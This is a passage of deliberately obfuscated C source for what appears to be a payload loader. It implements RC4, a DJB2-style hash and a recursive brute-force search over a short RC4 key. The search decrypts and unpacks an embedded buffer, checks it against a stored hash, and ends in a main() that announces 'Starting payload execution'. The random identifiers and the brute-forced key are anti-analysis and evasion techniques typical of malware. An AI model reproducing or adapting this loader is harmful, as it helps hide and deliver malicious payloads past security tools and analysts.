    for (o2IKcZeptpOhcCdP5xUlPs4tjzFNmj45jC4gQTAkDZVTDzdnE2Dp_pWxzz6X5rY_ibYV4xrX1mkh865q6weBrvfRHkGMC8o9cozAnCtg6J_Cp42qTIFKrBOuSi8HCrAHVGXAss1DJMWtXORt_aVCyzOupd9UFqUIJwS7aUwfDx2bU_EdAWMY7Vh1FgBXlWSi = 0; o2IKcZeptpOhcCdP5xUlPs4tjzFNmj45jC4gQTAkDZVTDzdnE2Dp_pWxzz6X5rY_ibYV4xrX1mkh865q6weBrvfRHkGMC8o9cozAnCtg6J_Cp42qTIFKrBOuSi8HCrAHVGXAss1DJMWtXORt_aVCyzOupd9UFqUIJwS7aUwfDx2bU_EdAWMY7Vh1FgBXlWSi < an4wbuF0b5BZHxxbzxJh8j8Akylc7DckvXCoYHswOnMaNn0_a06TNccEp3N28W5UsBJqF7Rfi9s01NKrQa002hyFidn5YK_dGYAn4vb9jCQYUtuMYW; o2IKcZeptpOhcCdP5xUlPs4tjzFNmj45jC4gQTAkDZVTDzdnE2Dp_pWxzz6X5rY_ibYV4xrX1mkh865q6weBrvfRHkGMC8o9cozAnCtg6J_Cp42qTIFKrBOuSi8HCrAHVGXAss1DJMWtXORt_aVCyzOupd9UFqUIJwS7aUwfDx2bU_EdAWMY7Vh1FgBXlWSi++) {
        st->j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq = (st->j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq + 1) % 256;
        st->KdyNc7CEoiUtKZ5nf3HdOHsEEPhH4F9xubTijeJmkUtKZnycm = (st->KdyNc7CEoiUtKZ5nf3HdOHsEEPhH4F9xubTijeJmkUtKZnycm + st->d0xyea4l[st->j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq]) % 256;
        nj1BKNazBTB49pCEsFR7c5_z3w958BsWYMeUQJVksp7NmCJ4iqegs9xeFHAupqg7X6F2zpjqQI3LBzK72aOYCRkYxCYFfHnO0l9EeXVPC202qbbOtJvBHDRYdRtCqdD6fe_dhzgju0r3aCnOBqXG7c4Aubk5O2Y7M5wue5i2x8tzVBB1PQct2AzyQC = st->d0xyea4l[st->j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq];
        st->d0xyea4l[st->j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq] = st->d0xyea4l[st->KdyNc7CEoiUtKZ5nf3HdOHsEEPhH4F9xubTijeJmkUtKZnycm];
        st->d0xyea4l[st->KdyNc7CEoiUtKZ5nf3HdOHsEEPhH4F9xubTijeJmkUtKZnycm] = nj1BKNazBTB49pCEsFR7c5_z3w958BsWYMeUQJVksp7NmCJ4iqegs9xeFHAupqg7X6F2zpjqQI3LBzK72aOYCRkYxCYFfHnO0l9EeXVPC202qbbOtJvBHDRYdRtCqdD6fe_dhzgju0r3aCnOBqXG7c4Aubk5O2Y7M5wue5i2x8tzVBB1PQct2AzyQC;
        K = st->d0xyea4l[(st->d0xyea4l[st->j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq] + st->d0xyea4l[st->KdyNc7CEoiUtKZ5nf3HdOHsEEPhH4F9xubTijeJmkUtKZnycm]) % 256];
        vhb8KlLDbkxn_jsFJvL575M9HkxDRZJzkyMT94zeeBbsLxrensdZGZglvo4SAX6aZI9CjGu6EsKv9y_AG1ISutyMVUrCx4d[o2IKcZeptpOhcCdP5xUlPs4tjzFNmj45jC4gQTAkDZVTDzdnE2Dp_pWxzz6X5rY_ibYV4xrX1mkh865q6weBrvfRHkGMC8o9cozAnCtg6J_Cp42qTIFKrBOuSi8HCrAHVGXAss1DJMWtXORt_aVCyzOupd9UFqUIJwS7aUwfDx2bU_EdAWMY7Vh1FgBXlWSi] ^= K;
    }
}


unsigned int VY0gLkfsgxy_n1w_Xkwg0QUQvrcQQevONdpjQkGjT6eMqxzsG0PucolKIcOL1jLo9tjnX2bJmofizeOLb8O1Eju4VHhcF8f3OTs74UvuHTUkSJf2yzY970TvsLARNMdH6XFgOsrShq1U6EIG2Zqrtb647ev_dT1tKteVjnQ(const unsigned char *vhb8KlLDbkxn_jsFJvL575M9HkxDRZJzkyMT94zeeBbsLxrensdZGZglvo4SAX6aZI9CjGu6EsKv9y_AG1ISutyMVUrCx4d, int an4wbuF0b5BZHxxbzxJh8j8Akylc7DckvXCoYHswOnMaNn0_a06TNccEp3N28W5UsBJqF7Rfi9s01NKrQa002hyFidn5YK_dGYAn4vb9jCQYUtuMYW) {
    unsigned int ojUbmWC5EYcbfoT8redymSLa = 5381;
    int j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq;
    
    for (j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq = 0; j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq < an4wbuF0b5BZHxxbzxJh8j8Akylc7DckvXCoYHswOnMaNn0_a06TNccEp3N28W5UsBJqF7Rfi9s01NKrQa002hyFidn5YK_dGYAn4vb9jCQYUtuMYW; j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq++) {
        ojUbmWC5EYcbfoT8redymSLa = ((ojUbmWC5EYcbfoT8redymSLa * 33) + vhb8KlLDbkxn_jsFJvL575M9HkxDRZJzkyMT94zeeBbsLxrensdZGZglvo4SAX6aZI9CjGu6EsKv9y_AG1ISutyMVUrCx4d[j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq]) & 0xFFFFFFFF;
    }
    return ojUbmWC5EYcbfoT8redymSLa;
}


unsigned int IaMxiQgwCebu9MdPechebVodDt1fLoy4KJD758CRm7uEwem45L7_XKBMjkuWgf4ORbPCSh3hJPuskeX1TM(const unsigned char *yqEvJoVKuodPV43dFF0yJlDxYAFbY74TD3_oUG8xIKvmLjfaM6eBHakCEnMYbIDTVAh9dfB_4PzCiPm3ei_L8og_8rPUX4p6ZxY9KnyjxKB6cH9NaQm0fx9X34GnatYOY7K9XS8qFe2CYjTBfvT6zMBpYZKOJDNQbuQLPsQLZ029oqc69tVTJBHRX5XaTHk6rQnkjII7bIdXz8g_mcyr) {
    return (unsigned int)yqEvJoVKuodPV43dFF0yJlDxYAFbY74TD3_oUG8xIKvmLjfaM6eBHakCEnMYbIDTVAh9dfB_4PzCiPm3ei_L8og_8rPUX4p6ZxY9KnyjxKB6cH9NaQm0fx9X34GnatYOY7K9XS8qFe2CYjTBfvT6zMBpYZKOJDNQbuQLPsQLZ029oqc69tVTJBHRX5XaTHk6rQnkjII7bIdXz8g_mcyr[0] | 
           ((unsigned int)yqEvJoVKuodPV43dFF0yJlDxYAFbY74TD3_oUG8xIKvmLjfaM6eBHakCEnMYbIDTVAh9dfB_4PzCiPm3ei_L8og_8rPUX4p6ZxY9KnyjxKB6cH9NaQm0fx9X34GnatYOY7K9XS8qFe2CYjTBfvT6zMBpYZKOJDNQbuQLPsQLZ029oqc69tVTJBHRX5XaTHk6rQnkjII7bIdXz8g_mcyr[1] << 8) | 
           ((unsigned int)yqEvJoVKuodPV43dFF0yJlDxYAFbY74TD3_oUG8xIKvmLjfaM6eBHakCEnMYbIDTVAh9dfB_4PzCiPm3ei_L8og_8rPUX4p6ZxY9KnyjxKB6cH9NaQm0fx9X34GnatYOY7K9XS8qFe2CYjTBfvT6zMBpYZKOJDNQbuQLPsQLZ029oqc69tVTJBHRX5XaTHk6rQnkjII7bIdXz8g_mcyr[2] << 16) | 
           ((unsigned int)yqEvJoVKuodPV43dFF0yJlDxYAFbY74TD3_oUG8xIKvmLjfaM6eBHakCEnMYbIDTVAh9dfB_4PzCiPm3ei_L8og_8rPUX4p6ZxY9KnyjxKB6cH9NaQm0fx9X34GnatYOY7K9XS8qFe2CYjTBfvT6zMBpYZKOJDNQbuQLPsQLZ029oqc69tVTJBHRX5XaTHk6rQnkjII7bIdXz8g_mcyr[3] << 24);
}


int AOEl2oW1A3C3C8069HyReJhQ8Oa9Y0buEcXjWR6_eKqLsv_dg7aTbFtPec0vF4YN22bQ6UKIMZrfiLIvrn4vlpg3LwT0NenaCB42oy6qm1SYn2O202O9lKNqolKCE5pvOPzyXdO7JImUYJe4O2Yz0geYfJ8QfCYu2gMkVSk8DuFB59hwHvZI(unsigned char *key, int pztyTHKfPQoEHcLLDv3t57pJ3OQt46DaMaraO7dCu28PAMhG2B0CMx4ooh0I0_7OgNgCQ5gbdzydRZKyjikHnfZd67XVdhaS, int zUHso2HdZ4tz34In8PzSgM66gY6ZGOWzYZjB_CQUMwofhU5tWTJbMq6SWh3TvoY70RsoWQsMlsK7RQqnlnRwjQPMp973q4YeuQDtuzi3WJJ5RLtCSCyUEy86eczkAnucaU_veVGnbxzLVSuiH6EIWkfwtdGuVBD1AZn3S2fQNOECd6FeDeXeLehicIk095ifAA8UU68rnfK1Fjokhei_Jqj_1Po7E4kK3EDxT2, unsigned char *hSdrKqc00FGk6GPjwOpEBEj, int FJiRVuZjr5_jbUlwUc7D0w5b6PqJuuENRqy0XjkoPAsWz, unsigned char *Rt6oPU8KcaNs1FQLX3KGOvrm, int *Niwqjae4eArBAJhkFZKwHdgFPmIbEIKqn1IsTrmVDpuMQ3xUHQdRjSIkkg7Dr56YQVhfbXHsDY9QZgGYkw1RaF9Y4GU4vEf_eO2uEoDy9jzrSFMYG8yo_zWgn4qO5joQZPUSHlqTo049MmgL3WaBc7S2plyEBcpX2feENnA217uYCssRwRY_z2DQBcCpRugFLmqCWBTg7qS60Pp5O1z2axqfE1qkThZoQzY) {
    int j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq;
    kErcei1OPwpxQPUMb dOsLCa_VlZTuMcyqsYLiG56OkHxaJ7GfzA8IzShEPfovf5M00CuZ4EHWyt3J2xWRU6oVaPHg0KmgTxeLEES61IczAyPOVSezHuEIBPz7JxMfMgwz4u2JMCi2BOJyiWn4ovREOZ0BTVsMNgnYilGKwJGSKk6JunOqBV6FXBlaJ8sSeWWFmmhWwxF8MjQkwRolYOsDFa5Cbhcp0Gw_E1KeNzxcSNtftyNBfkupjslGYAieR_1Aj1NJyAuMzqCU7lTL;
    unsigned int T8Ut7LkcaQGkvO4W2j0VDP93gpXINF4z;
    unsigned int dNOXqqq3ahwzcWsYsor3hatBR0vv8PIahBWuWeOJAZ2O2rlDjz3nHnD5mR4ohWYG9FFApX9yB74dBWiaQkYKZWOw_VsAxL65d2iEZ9ybw9joJh_Dk4KlrWXay2FDVTP2ipR4bIkKlG89i3e3CSS16zHc1QnyRQ0M9Q7Zvizpa7fB8mZfHUbbnnWKiqkAZRX4GOGbswibaTUf717Lhr5oOk = IaMxiQgwCebu9MdPechebVodDt1fLoy4KJD758CRm7uEwem45L7_XKBMjkuWgf4ORbPCSh3hJPuskeX1TM(QFBq5Nzwi2HmEpyYdaI3cG39XY9qS5hpgdGo99nGo0EGNBD1sloiC8Lqgh17qya3LUtX8ony);
    
    if (pztyTHKfPQoEHcLLDv3t57pJ3OQt46DaMaraO7dCu28PAMhG2B0CMx4ooh0I0_7OgNgCQ5gbdzydRZKyjikHnfZd67XVdhaS == zUHso2HdZ4tz34In8PzSgM66gY6ZGOWzYZjB_CQUMwofhU5tWTJbMq6SWh3TvoY70RsoWQsMlsK7RQqnlnRwjQPMp973q4YeuQDtuzi3WJJ5RLtCSCyUEy86eczkAnucaU_veVGnbxzLVSuiH6EIWkfwtdGuVBD1AZn3S2fQNOECd6FeDeXeLehicIk095ifAA8UU68rnfK1Fjokhei_Jqj_1Po7E4kK3EDxT2) {
        unsigned char kg7Lo4ogsratLSEhgkDKRGTANUrTIb0PIM1R60lHEDE9roeQwF9JF6UQYZtw3yMTCOpYhhdxjFyqj5b3XCKDE_HFdeJqHZgnbylZ_vC9RMGCGRy5rhz_NriBK5ADEJKxyyCDfkyAE4xi8MP4VJPsBqcOCviHYwltYicGsSjVQdieIusdjLYDH73ISKecFEbiyyzdQXFumnhaw940kDTjd_L_QDNf7[8192];
        unsigned char fCUlcBfa57FB0IkOhGbsHPQWGEu8pxBw1nNciNe65WS3wZ1x3m5Nl5qIS4aDan1[8192];
        
        
        if (KEY_SIZE == 1) {
            printf("[~] Testing RC4 key: %02x\n", key[0]);
        } else if (KEY_SIZE == 2) {
            printf("[~] Testing RC4 key: %02x%02x\n", key[0], key[1]);
        } else {
            printf("[~] Testing RC4 key: %02x%02x%02x\n", key[0], key[1], key[2]);
        }
        
        memcpy(kg7Lo4ogsratLSEhgkDKRGTANUrTIb0PIM1R60lHEDE9roeQwF9JF6UQYZtw3yMTCOpYhhdxjFyqj5b3XCKDE_HFdeJqHZgnbylZ_vC9RMGCGRy5rhz_NriBK5ADEJKxyyCDfkyAE4xi8MP4VJPsBqcOCviHYwltYicGsSjVQdieIusdjLYDH73ISKecFEbiyyzdQXFumnhaw940kDTjd_L_QDNf7, hSdrKqc00FGk6GPjwOpEBEj, FJiRVuZjr5_jbUlwUc7D0w5b6PqJuuENRqy0XjkoPAsWz);
        SJ_aEnvCcNgJvUZu9nuqthbO9IaIInD2VKRZF9zguiQabUEUozbaAj_9jLNRc0a(&dOsLCa_VlZTuMcyqsYLiG56OkHxaJ7GfzA8IzShEPfovf5M00CuZ4EHWyt3J2xWRU6oVaPHg0KmgTxeLEES61IczAyPOVSezHuEIBPz7JxMfMgwz4u2JMCi2BOJyiWn4ovREOZ0BTVsMNgnYilGKwJGSKk6JunOqBV6FXBlaJ8sSeWWFmmhWwxF8MjQkwRolYOsDFa5Cbhcp0Gw_E1KeNzxcSNtftyNBfkupjslGYAieR_1Aj1NJyAuMzqCU7lTL, key, zUHso2HdZ4tz34In8PzSgM66gY6ZGOWzYZjB_CQUMwofhU5tWTJbMq6SWh3TvoY70RsoWQsMlsK7RQqnlnRwjQPMp973q4YeuQDtuzi3WJJ5RLtCSCyUEy86eczkAnucaU_veVGnbxzLVSuiH6EIWkfwtdGuVBD1AZn3S2fQNOECd6FeDeXeLehicIk095ifAA8UU68rnfK1Fjokhei_Jqj_1Po7E4kK3EDxT2);
        rm5eGVP28cXJSfphHfbrg19YvX49WbPTSgJSxa68RawMgR6VR76h05rOggrgLVM_F_sY0ol2cDbKlrfTPaSzw9rW7i3wNYRN0y0ZpMtudxhDnmTCDZlA_jLd51kamTgE3_QLqtLZVEdhAh0Hd4FRn8dbT6FyueSvJdXISLQgcIofsXlIy564yimyhIzEFFKC7B3WuKjPZRTmLIlPKwdIGmvoGYXyfn(&dOsLCa_VlZTuMcyqsYLiG56OkHxaJ7GfzA8IzShEPfovf5M00CuZ4EHWyt3J2xWRU6oVaPHg0KmgTxeLEES61IczAyPOVSezHuEIBPz7JxMfMgwz4u2JMCi2BOJyiWn4ovREOZ0BTVsMNgnYilGKwJGSKk6JunOqBV6FXBlaJ8sSeWWFmmhWwxF8MjQkwRolYOsDFa5Cbhcp0Gw_E1KeNzxcSNtftyNBfkupjslGYAieR_1Aj1NJyAuMzqCU7lTL, kg7Lo4ogsratLSEhgkDKRGTANUrTIb0PIM1R60lHEDE9roeQwF9JF6UQYZtw3yMTCOpYhhdxjFyqj5b3XCKDE_HFdeJqHZgnbylZ_vC9RMGCGRy5rhz_NriBK5ADEJKxyyCDfkyAE4xi8MP4VJPsBqcOCviHYwltYicGsSjVQdieIusdjLYDH73ISKecFEbiyyzdQXFumnhaw940kDTjd_L_QDNf7, FJiRVuZjr5_jbUlwUc7D0w5b6PqJuuENRqy0XjkoPAsWz);
        
        
        int aqrqjimK19onFlms_pngsvXjxeGHmq0SWI7nBGehXNmFcIyLpvZv9sstWqPM8EmbG_nQ9qROilsGNmCWb5aF9QtkEtJFV4OGaGizC_tXzKR7xOgkpNfRT6JCtuCSmQ3CcjYbR6btoV_b_Q4 = kmGn0X7sI7QvA0s8gvkyawpRx3T2o6BsmRvI8jg2SDpYRKq84ckNizHQfTWIHdw8sZv8MxAIQUagoxLUkLc5Pwp1uYMZh7ayRwEsC8rlm0VdGgzIZ1FT0HsBp6bxM966Rqt8ZrmmvKeqPhvry1WMMYyzWGZhRqFSDOCSaw32dJbj0QO4vNCLdaB9OirmFH3(kg7Lo4ogsratLSEhgkDKRGTANUrTIb0PIM1R60lHEDE9roeQwF9JF6UQYZtw3yMTCOpYhhdxjFyqj5b3XCKDE_HFdeJqHZgnbylZ_vC9RMGCGRy5rhz_NriBK5ADEJKxyyCDfkyAE4xi8MP4VJPsBqcOCviHYwltYicGsSjVQdieIusdjLYDH73ISKecFEbiyyzdQXFumnhaw940kDTjd_L_QDNf7, FJiRVuZjr5_jbUlwUc7D0w5b6PqJuuENRqy0XjkoPAsWz, fCUlcBfa57FB0IkOhGbsHPQWGEu8pxBw1nNciNe65WS3wZ1x3m5Nl5qIS4aDan1, 8192);
        
        if (aqrqjimK19onFlms_pngsvXjxeGHmq0SWI7nBGehXNmFcIyLpvZv9sstWqPM8EmbG_nQ9qROilsGNmCWb5aF9QtkEtJFV4OGaGizC_tXzKR7xOgkpNfRT6JCtuCSmQ3CcjYbR6btoV_b_Q4 > 0) {
            
            printf("[~] Validating hash\n");
            unsigned char LoiyovzUL9Ty1xyUfkQa7spxbgUHxCUg5LsnbuuNjkUbYcJbNwic4AYGFxIxVk4BRpMMXULm2lw7o0weAePMKQ898x8QXoHbevz59LOUFxFfewAFgdD4B2GcxoswZcrFl57fDsLMkzk[8192];
            memcpy(LoiyovzUL9Ty1xyUfkQa7spxbgUHxCUg5LsnbuuNjkUbYcJbNwic4AYGFxIxVk4BRpMMXULm2lw7o0weAePMKQ898x8QXoHbevz59LOUFxFfewAFgdD4B2GcxoswZcrFl57fDsLMkzk, fCUlcBfa57FB0IkOhGbsHPQWGEu8pxBw1nNciNe65WS3wZ1x3m5Nl5qIS4aDan1, aqrqjimK19onFlms_pngsvXjxeGHmq0SWI7nBGehXNmFcIyLpvZv9sstWqPM8EmbG_nQ9qROilsGNmCWb5aF9QtkEtJFV4OGaGizC_tXzKR7xOgkpNfRT6JCtuCSmQ3CcjYbR6btoV_b_Q4);
            int AQ5GxYWi12nXKagSaEWO3Eai3cmLhA6qXVcnlZdTNDCjdXZJaWPXA3IcD09gssO7BczGskxkmrJ8uhsQTewnljCPKXJC9vP3FqPjpPxRU0ZJvCdHB8NeiRiADZnhdEDJCNmgEt0vygRTXyNSnG6ISRAeZIyJzIHMt0MdM4 = sizeof(WI7FI7u1jDZtNeAWi4v41yoSwWq4nrrWJEEcUaGHh68LHXxQoS5zWyExSRbX8R5pH9iJ3Rta87bVI2uHXHsqB3qpnCYqIKA_BiStCqw68h9wea0_14gFjVkG95TIW06oF05igDnxG5yR7GPQxsppo3H9TIxrRAKlXsjH4j) - 1;
            memcpy(LoiyovzUL9Ty1xyUfkQa7spxbgUHxCUg5LsnbuuNjkUbYcJbNwic4AYGFxIxVk4BRpMMXULm2lw7o0weAePMKQ898x8QXoHbevz59LOUFxFfewAFgdD4B2GcxoswZcrFl57fDsLMkzk + aqrqjimK19onFlms_pngsvXjxeGHmq0SWI7nBGehXNmFcIyLpvZv9sstWqPM8EmbG_nQ9qROilsGNmCWb5aF9QtkEtJFV4OGaGizC_tXzKR7xOgkpNfRT6JCtuCSmQ3CcjYbR6btoV_b_Q4, WI7FI7u1jDZtNeAWi4v41yoSwWq4nrrWJEEcUaGHh68LHXxQoS5zWyExSRbX8R5pH9iJ3Rta87bVI2uHXHsqB3qpnCYqIKA_BiStCqw68h9wea0_14gFjVkG95TIW06oF05igDnxG5yR7GPQxsppo3H9TIxrRAKlXsjH4j, AQ5GxYWi12nXKagSaEWO3Eai3cmLhA6qXVcnlZdTNDCjdXZJaWPXA3IcD09gssO7BczGskxkmrJ8uhsQTewnljCPKXJC9vP3FqPjpPxRU0ZJvCdHB8NeiRiADZnhdEDJCNmgEt0vygRTXyNSnG6ISRAeZIyJzIHMt0MdM4);
            
            
            T8Ut7LkcaQGkvO4W2j0VDP93gpXINF4z = VY0gLkfsgxy_n1w_Xkwg0QUQvrcQQevONdpjQkGjT6eMqxzsG0PucolKIcOL1jLo9tjnX2bJmofizeOLb8O1Eju4VHhcF8f3OTs74UvuHTUkSJf2yzY970TvsLARNMdH6XFgOsrShq1U6EIG2Zqrtb647ev_dT1tKteVjnQ(LoiyovzUL9Ty1xyUfkQa7spxbgUHxCUg5LsnbuuNjkUbYcJbNwic4AYGFxIxVk4BRpMMXULm2lw7o0weAePMKQ898x8QXoHbevz59LOUFxFfewAFgdD4B2GcxoswZcrFl57fDsLMkzk, aqrqjimK19onFlms_pngsvXjxeGHmq0SWI7nBGehXNmFcIyLpvZv9sstWqPM8EmbG_nQ9qROilsGNmCWb5aF9QtkEtJFV4OGaGizC_tXzKR7xOgkpNfRT6JCtuCSmQ3CcjYbR6btoV_b_Q4 + AQ5GxYWi12nXKagSaEWO3Eai3cmLhA6qXVcnlZdTNDCjdXZJaWPXA3IcD09gssO7BczGskxkmrJ8uhsQTewnljCPKXJC9vP3FqPjpPxRU0ZJvCdHB8NeiRiADZnhdEDJCNmgEt0vygRTXyNSnG6ISRAeZIyJzIHMt0MdM4);
            
            if (T8Ut7LkcaQGkvO4W2j0VDP93gpXINF4z == dNOXqqq3ahwzcWsYsor3hatBR0vv8PIahBWuWeOJAZ2O2rlDjz3nHnD5mR4ohWYG9FFApX9yB74dBWiaQkYKZWOw_VsAxL65d2iEZ9ybw9joJh_Dk4KlrWXay2FDVTP2ipR4bIkKlG89i3e3CSS16zHc1QnyRQ0M9Q7Zvizpa7fB8mZfHUbbnnWKiqkAZRX4GOGbswibaTUf717Lhr5oOk) {
                if (KEY_SIZE == 1) {
                    printf("[+] Valid key found: %02x\n", key[0]);
                } else if (KEY_SIZE == 2) {
                    printf("[+] Valid key found: %02x%02x\n", key[0], key[1]);
                } else {
                    printf("[+] Valid key found: %02x%02x%02x\n", key[0], key[1], key[2]);
                }
                memcpy(Rt6oPU8KcaNs1FQLX3KGOvrm, fCUlcBfa57FB0IkOhGbsHPQWGEu8pxBw1nNciNe65WS3wZ1x3m5Nl5qIS4aDan1, aqrqjimK19onFlms_pngsvXjxeGHmq0SWI7nBGehXNmFcIyLpvZv9sstWqPM8EmbG_nQ9qROilsGNmCWb5aF9QtkEtJFV4OGaGizC_tXzKR7xOgkpNfRT6JCtuCSmQ3CcjYbR6btoV_b_Q4);
                *Niwqjae4eArBAJhkFZKwHdgFPmIbEIKqn1IsTrmVDpuMQ3xUHQdRjSIkkg7Dr56YQVhfbXHsDY9QZgGYkw1RaF9Y4GU4vEf_eO2uEoDy9jzrSFMYG8yo_zWgn4qO5joQZPUSHlqTo049MmgL3WaBc7S2plyEBcpX2feENnA217uYCssRwRY_z2DQBcCpRugFLmqCWBTg7qS60Pp5O1z2axqfE1qkThZoQzY = aqrqjimK19onFlms_pngsvXjxeGHmq0SWI7nBGehXNmFcIyLpvZv9sstWqPM8EmbG_nQ9qROilsGNmCWb5aF9QtkEtJFV4OGaGizC_tXzKR7xOgkpNfRT6JCtuCSmQ3CcjYbR6btoV_b_Q4;
                return 1;
            }
        }
        return 0;
    }
    
    
    for (j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq = 1; j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq <= 255; j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq++) {
        key[pztyTHKfPQoEHcLLDv3t57pJ3OQt46DaMaraO7dCu28PAMhG2B0CMx4ooh0I0_7OgNgCQ5gbdzydRZKyjikHnfZd67XVdhaS] = (unsigned char)j4cRd1USm6CS2CjWeSokMBEFqLtNSW9GBdgGr8aaErPkOTUW0kkHe7iTBq4lAMjXNoNulyX3JiQv2vMMLR2155xtStk1E8Aqmvau8hxmO6RbJpHpaERJU35MY395S3MjjnUpstTHbYjDnzdeoHvWns_xurQ5joJ_01FVlgprj37GIbvT1l0jvioCufa4D_vZq;
        if (AOEl2oW1A3C3C8069HyReJhQ8Oa9Y0buEcXjWR6_eKqLsv_dg7aTbFtPec0vF4YN22bQ6UKIMZrfiLIvrn4vlpg3LwT0NenaCB42oy6qm1SYn2O202O9lKNqolKCE5pvOPzyXdO7JImUYJe4O2Yz0geYfJ8QfCYu2gMkVSk8DuFB59hwHvZI(key, pztyTHKfPQoEHcLLDv3t57pJ3OQt46DaMaraO7dCu28PAMhG2B0CMx4ooh0I0_7OgNgCQ5gbdzydRZKyjikHnfZd67XVdhaS + 1, zUHso2HdZ4tz34In8PzSgM66gY6ZGOWzYZjB_CQUMwofhU5tWTJbMq6SWh3TvoY70RsoWQsMlsK7RQqnlnRwjQPMp973q4YeuQDtuzi3WJJ5RLtCSCyUEy86eczkAnucaU_veVGnbxzLVSuiH6EIWkfwtdGuVBD1AZn3S2fQNOECd6FeDeXeLehicIk095ifAA8UU68rnfK1Fjokhei_Jqj_1Po7E4kK3EDxT2, hSdrKqc00FGk6GPjwOpEBEj, FJiRVuZjr5_jbUlwUc7D0w5b6PqJuuENRqy0XjkoPAsWz, Rt6oPU8KcaNs1FQLX3KGOvrm, Niwqjae4eArBAJhkFZKwHdgFPmIbEIKqn1IsTrmVDpuMQ3xUHQdRjSIkkg7Dr56YQVhfbXHsDY9QZgGYkw1RaF9Y4GU4vEf_eO2uEoDy9jzrSFMYG8yo_zWgn4qO5joQZPUSHlqTo049MmgL3WaBc7S2plyEBcpX2feENnA217uYCssRwRY_z2DQBcCpRugFLmqCWBTg7qS60Pp5O1z2axqfE1qkThZoQzY)) {
            return 1;
        }
    }
    
    return 0;
}

int main() {
    printf("[~] Starting payload execution\n");
    unsigned char key[KEY_SIZE];
    unsigned char Rt6oPU8KcaNs1FQLX3KGOvrm[8192];
